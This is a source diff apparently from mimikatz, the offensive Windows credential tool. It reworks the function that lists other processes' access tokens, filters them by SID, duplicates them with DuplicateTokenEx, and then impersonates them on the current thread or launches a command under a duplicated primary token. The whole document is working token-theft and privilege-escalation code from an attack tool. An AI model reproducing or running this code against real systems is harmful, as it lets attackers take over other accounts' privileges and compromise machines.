@@ -108,7 +108,8 @@ NTSTATUS kuhl_m_token_list_or_elevate(int argc, wchar_t * argv[], BOOL elevate, 
 					kprintf(L"%s\\%s\n", domain, name);
 					LocalFree(name);
 					LocalFree(domain);
-				} else PRINT_ERROR_AUTO(L"kull_m_token_getNameDomainFromSID");
+				}
+				else PRINT_ERROR_AUTO(L"kull_m_token_getNameDomainFromSID");
 			}
 			else PRINT_ERROR_AUTO(L"kull_m_local_domain_user_CreateWellKnownSid");
 		}
@@ -168,6 +169,8 @@ BOOL CALLBACK kuhl_m_token_list_or_elevate_callback(HANDLE hToken, DWORD ptid, P
 	BOOL isUserOK = TRUE;
 	PKUHL_M_TOKEN_ELEVATE_DATA pData = (PKUHL_M_TOKEN_ELEVATE_DATA) pvArg;
 	PWSTR name, domainName;
+	TOKEN_TYPE ttTarget;
+	SECURITY_IMPERSONATION_LEVEL ilTarget;
 
 	if(ptid != GetCurrentProcessId())
 	{
@@ -184,35 +187,47 @@ BOOL CALLBACK kuhl_m_token_list_or_elevate_callback(HANDLE hToken, DWORD ptid, P
 			}
 			else if(pData->tokenId)
 				isUserOK = (pData->tokenId == tokenStats.TokenId.LowPart);
-
-			if(isUserOK && DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE | (pData->runIt ? TOKEN_ASSIGN_PRIMARY : 0), NULL, (tokenStats.TokenType == TokenPrimary) ? SecurityDelegation : tokenStats.ImpersonationLevel, TokenImpersonation, &hNewToken))
+			else if(pData->pSid)
 			{
-				if(pData->pSid)
-				{
-					isUserOK = FALSE;
-					if(!CheckTokenMembership(hNewToken, pData->pSid, &isUserOK))
-						PRINT_ERROR_AUTO(L"CheckTokenMembership");
-				}
-				if(isUserOK)
-				{
-					kprintf(L"%u\t", ptid);
-					kuhl_m_token_displayAccount(hToken);
+				isUserOK = FALSE;
+				kull_m_token_CheckTokenMembership(hToken, pData->pSid, &isUserOK);
+			}
 
-					if(pData->elevateIt)
-					{
-						if(SetThreadToken(NULL, hNewToken))
-						{
-							kprintf(L" -> Impersonated !\n");
-							kuhl_m_token_whoami(0, NULL);
-							isUserOK = FALSE;
-						}
-						else PRINT_ERROR_AUTO(L"SetThreadToken");
-					}
-					else if(pData->runIt)
-						isUserOK = !kull_m_process_run_data(pData->pCommandLine, hNewToken);
+			if(isUserOK)
+			{
+				kprintf(L"%u\t", ptid);
+				kuhl_m_token_displayAccount(hToken);
+				if(pData->elevateIt)
+				{
+					ttTarget = TokenImpersonation;
+					ilTarget = (tokenStats.TokenType == TokenPrimary) ? SecurityDelegation : tokenStats.ImpersonationLevel;
 				}
-				else isUserOK = TRUE;
-				CloseHandle(hNewToken);
+				else if(pData->runIt)
+				{
+					ttTarget = TokenPrimary;
+					ilTarget = SecurityAnonymous;
+				}
+
+				if(pData->elevateIt ||  pData->runIt)
+				{
+					if(DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE | (pData->runIt ? (TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID) : 0), NULL, ilTarget, ttTarget, &hNewToken))
+					{
+						if(pData->elevateIt)
+						{
+							if(SetThreadToken(NULL, hNewToken))
+							{
+								kprintf(L" -> Impersonated !\n");
+								kuhl_m_token_whoami(0, NULL);
+								isUserOK = FALSE;
+							}
+							else PRINT_ERROR_AUTO(L"SetThreadToken");
+						}
+						else if(pData->runIt)
+							isUserOK = !kull_m_process_run_data(pData->pCommandLine, hNewToken);
+
+						CloseHandle(hNewToken);
+					}
+				}
 			}
 			else isUserOK = TRUE;
 		}
